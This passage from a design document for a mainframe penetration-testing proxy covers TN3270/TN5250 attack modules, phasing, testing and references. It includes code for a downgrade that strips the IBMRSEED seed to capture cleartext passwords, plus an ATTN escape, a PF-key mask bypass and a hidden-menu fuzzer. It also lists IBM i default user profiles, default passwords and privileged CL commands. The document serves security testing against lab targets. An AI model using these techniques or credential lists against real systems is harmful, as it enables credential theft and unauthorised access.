    hdr = bytearray(HDR_LEN)
    hdr[0] = (rec_len >> 8) & 0xff
    hdr[1] = rec_len & 0xff
    hdr[2] = 0x12; hdr[3] = 0xa0  # GDS record type
    hdr[5] = 0x04                  # var hdr len
    hdr[8] = OPCODE_PUT_GET        # opcode

    return bytes(hdr) + bytes(body) + b'\xff\xef'
```

#### `negotiate_hook()` — IBMRSEED downgrade + DEVNAME spoof

```python
# RFC 2877 negotiation uses telnet NEW-ENVIRON (option 0x27)
# Server sends:  IAC SB NEW-ENVIRON SEND USERVAR "IBMRSEED" <8-byte-seed> IAC SE
#                ff  fa  27          01   03      <ascii>     ...           ff f0
# Client replies with USERVAR IBMRSEED <client-seed> + IBMSUBSPW <encrypted-pw>
#
# RFC 2877 §5: "If [IBMRSEED] not returned or has empty value, clear-text is defaulted"
#
# Attack: strip the seed from server→client. Client never gets it,
# falls back to USERVAR "IBMSUBSPW" <CLEARTEXT-PASSWORD>. Proxy logs it.

NEW_ENVIRON = 0x27
USERVAR     = 0x03
IBMRSEED    = b'IBMRSEED'
DEVNAME     = b'DEVNAME'

def negotiate_hook(self, data: bytes, direction: str, opts: NegotiateOpts) -> bytes:
    if direction == 's2c' and opts.force_cleartext:
        # find USERVAR "IBMRSEED" <8 bytes> and remove the 8 seed bytes
        idx = data.find(bytes([USERVAR]) + IBMRSEED)
        if idx != -1:
            # USERVAR(1) + "IBMRSEED"(8) + seed(8) — strip the seed
            seed_start = idx + 1 + len(IBMRSEED)
            self._stripped_seed = data[seed_start:seed_start+8]  # log for findings
            data = data[:seed_start] + data[seed_start+8:]

    if direction == 'c2s' and opts.spoof_device_name:
        # rewrite USERVAR "DEVNAME" <name> VALUE <new-name>
        idx = data.find(bytes([USERVAR]) + DEVNAME)
        if idx != -1:
            # ... splice in opts.spoof_device_name
            ...

    if direction == 'c2s' and self._stripped_seed:
        # watch for the cleartext password coming back
        idx = data.find(bytes([USERVAR]) + b'IBMSUBSPW')
        if idx != -1:
            # extract password (until next USERVAR or VAR or IAC)
            pw = self._extract_uservar_value(data, idx + 1 + len(b'IBMSUBSPW'))
            self.captured_creds.append(pw)

    return data
```

### 4.2 `attacks/escape.py` — ATTN→F9 + SOH PF-Mask Bypass (~200 LOC)

**ATTN escape automation:**

ATTN on 5250 is signaled via the header flags byte (bit 0x40 in flags = ATN), not as an AID:

```python
def attempt_attn_escape(self) -> dict:
    # Step 1: send ATTN
    hdr = self._build_header(opcode=OPCODE_NONE, flags=0x40)  # ATN flag
    self.daemon.inject_to_server(hdr + b'\xff\xef')

    # Step 2: wait for response, look for "Operational Assistant" or system request menu
    screen = self._wait_for_screen(timeout=3)
    if 'Operational Assistant' not in screen.text and 'System Request' not in screen.text:
        return {'success': False, 'reason': 'ATTN handler overridden (ATNPGM set)'}

    # Step 3: send F9
    pkt = self.protocol.build_inbound(AID_TABLE['F9'], screen.cursor, [])
    self.daemon.inject_to_server(pkt)

    # Step 4: look for "===>" command-line prompt
    screen = self._wait_for_screen(timeout=3)
    if '===>' in screen.text:
        return {'success': True, 'screen': screen}
    return {'success': False, 'reason': 'F9 did not yield command line (LMTCPB enforced)'}
```

**SOH PF-Mask Bypass:**

Already implemented in `mutate()` above (when `opts.unprotect` is set, the SOH pf_mask gets rewritten to `0xFFFFFF`). The attack module just provides:
- A standalone toggle (separate from FFW unprotect)
- Detection of *which* keys were originally masked (so the AID fuzzer knows which to prioritize)

```python
def get_masked_keys(self, screen: Screen) -> list[str]:
    """Which F-keys did the host say were INVALID? Those are the interesting ones."""
    if not hasattr(screen, 'pf_mask'): return []
    masked = []
    for i in range(1, 25):
        if not (screen.pf_mask & (1 << (24 - i))):
            masked.append(f'F{i}')
    return masked
```

### 4.3 `attacks/menuwalk.py` — Menu Tree Fuzzer (~300 LOC)

IBM i is deeply menu-driven. This walks the tree.

```python
@dataclass
class MenuNode:
    screen_hash: str           # SHA256 of rendered text — for cycle detection
    options_displayed: set[str]   # what the screen SAYS is available
    options_tried: dict[str, 'MenuNode | str']   # option → child or "ERROR"/"DENIED"

def walk(self, max_depth=5, options_per_screen=range(1,100)) -> MenuNode:
    root = self._capture_current()
    self._walk_recursive(root, depth=0, max_depth=max_depth, opts=options_per_screen)
    return root

def _walk_recursive(self, node, depth, max_depth, opts):
    if depth >= max_depth: return
    for opt in opts:
        # type the option number, press Enter
        pkt = self.protocol.build_inbound(
            AID_TABLE['ENTER'],
            self._find_input_field_pos(node),
            [FieldWrite(row=..., col=..., data=self.codec.to_ebcdic(str(opt)))]
        )
        self.daemon.inject_to_server(pkt)
        child_screen = self._wait_for_screen()
        child_hash = hashlib.sha256(child_screen.text.encode()).hexdigest()

        if child_hash == node.screen_hash:
            node.options_tried[str(opt)] = "NOOP"
        elif 'not authorized' in child_screen.text.lower():
            node.options_tried[str(opt)] = "DENIED"
        elif 'not valid' in child_screen.text.lower():
            node.options_tried[str(opt)] = "INVALID"
        else:
            child = MenuNode(child_hash, self._extract_options(child_screen), {})
            node.options_tried[str(opt)] = child
            # === FINDING: option works but wasn't displayed ===
            if str(opt) not in node.options_displayed:
                self.findings.append(f"Hidden menu option {opt} at depth {depth}")
            self._walk_recursive(child, depth+1, max_depth, opts)
            # navigate back (F12 or F3)
            self._go_back()
```

### 4.4 GUI — 5 tabs

| Tab | Widgets |
|---|---|
| **Hack FFW** | Checkboxes: Bypass / Non-Display / Numeric / Mandatory-Entry / Field-Exit-Required. SOH PF-Mask Override checkbox (separate). |
| **Inject AID** | Grid of F1-24 + Roll/Help/Print/Clear/PA buttons. "Send All Masked Keys" button (uses `get_masked_keys()`). ATTN escape button with result label. |
| **Negotiation** | "Strip IBMRSEED" toggle + captured-creds table. DEVNAME spoof entry + wordlist mode. |
| **Inject Into Fields** | Identical to hack3270's tab — same `hackterm_core.inject` machinery, IBM i wordlists. |
| **Logs** | Identical to hack3270's — shared `hackterm_core.storage` viewer. |

### 4.5 Wordlists

**`injections/cl-commands.txt`** (~80 entries)
```
WRKACTJOB
WRKUSRPRF
WRKOBJ
DSPOBJAUT
DSPUSRPRF QSECOFR
DSPNETA
DSPSYSVAL QSECURITY
CHGUSRPRF
CRTUSRPRF
CALL QCMD
CALL QSYS/QCMDEXC
STRSQL
GO MAIN
GO CMDSEC
WRKSPLF
WRKJOBQ
SBMJOB
WRKSBSD
DSPJOBLOG
DSPLOG
WRKAUTL
WRKLNK '/'
QSH
STRPASTHR
SNDMSG
DSPSECAUD
... (more)
```

**`injections/ibmi-default-users.txt`** (~30 entries)
```
QSECOFR
QSYSOPR
QPGMR
QUSER
QSRV
QSRVBAS
QSPL
QSPLJOB
QDFTOWN
QTSTRQS
QLPINSTALL
QLPAUTO
QAUTPROF
QGATE
QMSF
QSNADS
QTCP
QTMHHTTP
QTMHHTP1
QDIRSRV
QYPSJSVR
QEJBSVR
QWEBADMIN
... (more — IBM i ships with ~40 default profiles)
```

**`injections/ibmi-default-passwords.txt`**
```
QSECOFR
QSYSOPR
QPGMR
QUSER
QSRV
QSRVBAS
22222222
... (most defaults = same as username, plus common changes)
```

**`injections/device-names.txt`** (~200 entries)
```
QPADEV0001
QPADEV0002
... (QPADEV0001-0099 — auto-created virtual devices)
DSP01
DSP02
... (common physical device descriptions)
```

---

## 5. Phasing

### Dependency graph

```
Phase 0: hackterm-core ──┬──→ Phase 1: hack3270 extraction ──→ Phase 3: hack3270 new attacks
   (~1800 LOC)           │           (~-800 net LOC)               (~2200 LOC)
                         │
                         └──→ Phase 2: hack5250 ─────────────────→ (ships independently)
                                   (~3500 LOC)
```

### Phase 0 — hackterm-core

| # | Deliverable | Done when | Test |
|---|---|---|---|
| 0.1 | `protocol.py` ABC + dataclasses | Stub `TN3270`/`TN5250` instantiate | mypy passes |
| 0.2 | `ebcdic.py` | Round-trips cp037/cp500/cp1140 | Property test: `to_ascii(to_ebcdic(s)) == s` for printable ASCII |
| 0.3 | `proxy.py` `ProxyDaemon` | Headless `tick()` works against `nc -l` | Mock protocol that uppercases bytes; assert client receives uppercased |
| 0.4 | `storage.py` | Existing `.db` opens | Open hack3270 db, read row 1 |
| 0.5 | `inject.py` mask machinery | Preamble/postamble split works | Synthetic packet with `****`, assert split correct |
| 0.6 | `api_server.py` scaffolding | `:31337` accepts, dispatches to registered handlers | Echo handler responds |
| 0.7 | `pyproject.toml` | `pip install -e .` works from sibling dirs | `from hackterm_core import Protocol` succeeds |

### Phase 1 — hack3270 extraction

| # | Step | Risk | Verification |
|---|---|---|---|
| 1.1 | Add core dep | None | import works |
| 1.2 | Replace 3 EBCDIC tables → `hackterm_core.ebcdic` | Medium | 256-byte diff old vs new, document divergences in `MIGRATION.md` |
| 1.3 | `daemon()` → `ProxyDaemon`, shim in libhack3270 | Medium | All 9 GUI tabs work against DVCA |
| 1.4 | SQLite → `hackterm_core.storage` | Low | Old `.db` replays |
| 1.5 | mask-injection → `hackterm_core.inject` | Low | `****` injection works |
| 1.6 | `manipulate()` wrapped as `TN3270Legacy(Protocol)` | None | Golden bytes-in-bytes-out test |

**Gate before Phase 3:** tcpdump before/after against DVCA, byte-diff. Zero divergence except documented EBCDIC fixes.

### Phase 2 — hack5250 (parallel with Phase 1)

| # | Step | Depends on |
|---|---|---|
| 2.1 | `tn5250.py`: `parse()` + `build_inbound()` | 0.1, 0.2 |
| 2.2 | Golden tests (PUB400 pcaps) | 2.1 |
| 2.3 | `tn5250.py`: `mutate()` (FFW + SOH mask) | 2.1 |
| 2.4 | `tn5250.py`: `negotiate_hook()` (IBMRSEED + DEVNAME) | 2.1 |
| 2.5 | Minimal GUI: Logs + Hack FFW tabs | 2.3, 0.3, 0.4 |
| 2.6 | Full GUI: Inject AID, Negotiation, Inject Fields | 2.4, 2.5, 0.5 |
| 2.7 | `attacks/escape.py` (ATTN→F9) | 2.6 |
| 2.8 | `attacks/menuwalk.py` | 2.6 |
| 2.9 | MCP server | 2.8 |
| 2.10 | Wordlists | (any time) |

**Test targets:**
- Synthetic datastreams: unit tests for 2.1-2.4
- PUB400.com pcaps: parser correctness validation (capture with Wireshark, no active testing)
- IBM i Cloud trial (30-day): live `mutate()` validation for 2.5+

### Phase 3 — hack3270 new attacks

| # | Module | Order rationale | Depends on |
|---|---|---|---|
| 3.1 | `tn3270_v2.py` | Foundation for everything else | Phase 1 done |
| 3.2 | `attacks/esm_passive.py` | Cheapest, ships in a day | 3.1 |
| 3.3 | `attacks/negotiation.py` (LU spoof) | Telnet-layer, almost independent of 3.1 | Phase 1 done |
| 3.4 | `attacks/structured.py` (Query Reply) | Medium — needs SF builder | 3.1 |
| 3.5 | `attacks/structured.py` (IND\$FILE) | Shares parser with 3.4 | 3.4 |
| 3.6 | `attacks/state_fuzz.py` | Hardest — `Screen` model, flow recording, replay | 3.1 |

Each: lib module → MCP tool → GUI tab → DVCA validation. MCP-first = test via Claude before building UI.

---

## 6. Testing Strategy

Currently zero tests. New tests cover **only new code** — legacy `manipulate()` etc. stay untested (Approach C accepts this).

| Layer | Approach |
|---|---|
| `hackterm-core` | Unit tests. `proxy.py` against `socketpair()`. `ebcdic.py` round-trip property tests. `storage.py` against `:memory:`. |
| `tn3270_v2` parser | Golden files from DVCA captures (`tests/golden/*.bin`). Assert `parse()` → expected `Screen`. Assert `mutate()` byte-diff matches expected. |
| `tn5250` parser | Golden files from PUB400 pcaps. Same approach. |
| Attack modules | Integration only. DVCA for 3270, IBM i trial for 5250. Not unit-testable — need a real host. |
| Regression | Phase 1's tcpdump before/after diff becomes a CI check (DVCA in Docker if feasible). |

**Anti-pattern:** No mocking of mainframe behavior. Mocks lie. Golden files from real captures only.

---

## 7. Risks

| Risk | Likelihood | Mitigation |
|---|---|---|
| Phase 1 extraction breaks something subtle that no test catches | Medium | tcpdump byte-diff gate; keep `manipulate()` codepath as fallback flag |
| 5250 parser wrong because Wireshark dissector ≠ real-world IBM i quirks | Medium | PUB400 pcaps catch most of this; IBM i trial catches the rest |
| IBMRSEED downgrade doesn't work because modern IBM i refuses cleartext | Low | RFC says client decides; if host overrides, that's a finding too (log it) |
| State fuzzer too noisy — every replay diverges on timestamps/seq#s | High | Fuzzy screen comparison (ignore known-volatile field positions) |
| Two GUIs drift apart over time | Certain | Accepted cost of Approach C. Mitigate: shared widgets in core where possible (Logs viewer at minimum). |
| User stops at Phase 0/1 because Phase 2/3 are too big | Medium | Phase 2 and 3 are independently shippable. Even partial Phase 3 (just ESM passive + LU spoof) is useful. |

---

## 8. Out of Scope

- Fixing hack3270's 4-parser/3-EBCDIC mess for *legacy* attacks (Approach C explicitly punts this)
- 5250 structured fields beyond detection (Write Structured Field `0xF3` exists but no Query Reply equivalent attack — yet)
- 5250 state-machine fuzzer (no COMMAREA equivalent on IBM i; revisit if menu-walk proves valuable)
- IND\$FILE *injection* hardening (carbon-copy mode is solid; inject mode is best-effort, may corrupt transfers)
- DBCS / non-Latin EBCDIC codepages
- 3270 graphics (GDDM), 5250 graphics
- Anything requiring authenticated CICS access (CEDA copy, CECI SPOOL — cicspwn already does these)

---

## 9. References

**3270**
- [GA23-0059 3270 Data Stream Programmer's Reference](https://bitsavers.trailing-edge.com/pdf/ibm/3270/GA23-0059-4_3270_Data_Stream_Programmers_Reference_Dec88.pdf)
- [RFC 2355 — TN3270 Enhancements](https://www.rfc-editor.org/rfc/rfc2355)
- [RFC 1646 — TN3270 LU-name & Printer Selection](https://www.rfc-editor.org/rfc/rfc1646.html)
- [IBM APAR PM80209 — DFHCE3530/3532 disclosure](https://www.ibm.com/support/pages/apar/PM80209)
- [IBM — Preset Terminal Security](https://www.ibm.com/docs/en/cics-ts/5.6?topic=users-preset-terminal-security)
- [DEF CON 30 — Labelle, Mainframe Buffer Overflows](https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Jake%20Labelle%20-%20Doing%20the%20Impossible%20How%20I%20Found%20Mainframe%20Buffer%20Overflows.pdf)
- [BMC — Top 8 Mainframe Exfil Vectors (IND\$FILE)](https://www.bmc.com/blogs/top-8-ways-hackers-exfiltrate-data-from-mainframe/)

**5250**
- [RFC 1205 — 5250 Telnet Interface](https://www.rfc-editor.org/rfc/rfc1205.html)
- [RFC 2877 — 5250 Telnet Enhancements (IBMRSEED)](https://datatracker.ietf.org/doc/html/rfc2877)
- IBM SC30-3533-04 — 5494 Remote Control Unit Functions Reference (canonical 5250 spec, not freely online)
- [Wireshark tn5250 dissector](https://github.com/wireshark/wireshark/blob/master/epan/dissectors/packet-tn5250.c)
- [lib5250 codes5250.h](https://github.com/hlandau/tn5250/blob/master/lib5250/codes5250.h)
- [Silent Signal — Simple IBM i Hacking](https://blog.silentsignal.eu/2022/09/05/simple-ibm-i-as-400-hacking/)
- [DEF CON 23 — Bart Kulach, IBM i Revealed](https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEF%20CON%2023%20-%20Bart-Kulach-Hack-the-Legacy-IBMi-revealed.pdf)
- [IT Jungle — White Hats Dismantle Menu-Based Security](https://www.itjungle.com/2023/02/06/white-hats-completely-dismantle-menu-based-security/)
